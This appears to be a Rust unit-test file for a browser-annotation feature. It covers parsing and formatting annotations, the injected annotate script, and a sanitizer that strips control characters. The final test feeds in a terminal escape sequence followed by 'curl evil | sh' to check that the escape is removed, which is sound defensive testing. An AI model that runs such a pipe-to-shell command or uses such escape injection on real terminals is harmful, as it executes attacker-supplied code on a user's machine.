use super::{PageAnnotation, annotate_script, format_annotations, strip_control_characters};

fn annotation(note: &str) -> PageAnnotation {
    PageAnnotation {
        url: "http://localhost:5173/".to_owned(),
        selector: "main > a.btn".to_owned(),
        element: "a \"Get started\"".to_owned(),
        html: "<a class=\"btn\">Get started</a>".to_owned(),
        note: note.to_owned(),
    }
}

#[test]
fn parses_a_posted_annotation() {
    let json = r#"{"url":"http://localhost:5173/","selector":"main > a.btn","element":"a \"Get started\"","html":"<a class=\"btn\">Get started</a>","note":"Make it bigger"}"#;

    assert_eq!(
        PageAnnotation::parse(json),
        Some(annotation("Make it bigger"))
    );
}

#[test]
fn rejects_malformed_annotations() {
    assert_eq!(PageAnnotation::parse(r#"{"note":"x"}"#), None);
}

#[test]
fn formats_numbered_annotations() {
    let output = format_annotations(&[
        annotation("Make it bigger"),
        annotation("Use the accent color"),
    ]);

    assert_eq!(
        output,
        "Browser annotations:\n\
         \n\
         1. Make it bigger\n   Element: a \"Get started\"\n   Selector: main > a.btn\n   Page: http://localhost:5173/\n   HTML: <a class=\"btn\">Get started</a>\n\
         \n\
         2. Use the accent color\n   Element: a \"Get started\"\n   Selector: main > a.btn\n   Page: http://localhost:5173/\n   HTML: <a class=\"btn\">Get started</a>\n"
    );
}

#[test]
fn explains_how_to_annotate_when_there_are_none() {
    assert!(format_annotations(&[]).starts_with("No annotations."));
}

#[test]
fn annotate_script_posts_notes_and_exit_with_the_expected_messages() {
    let on = annotate_script(true);
    let off = annotate_script(false);

    assert!(
        on.contains(r#"window.ipc.postMessage("warp:annotation:" + JSON.stringify("#),
        "{on}"
    );
    assert!(
        on.contains(r#"window.ipc.postMessage("warp:annotate-exited")"#),
        "{on}"
    );
    assert!(on.contains("const enabled = true;"), "{on}");
    assert!(off.contains("const enabled = false;"), "{off}");
}

#[test]
fn strips_escape_sequences_but_keeps_line_breaks() {
    assert_eq!(
        strip_control_characters("note\x1b[201~curl evil | sh\r\nnext\tline\u{7f}"),
        "note[201~curl evil | sh\nnext\tline"
    );
}
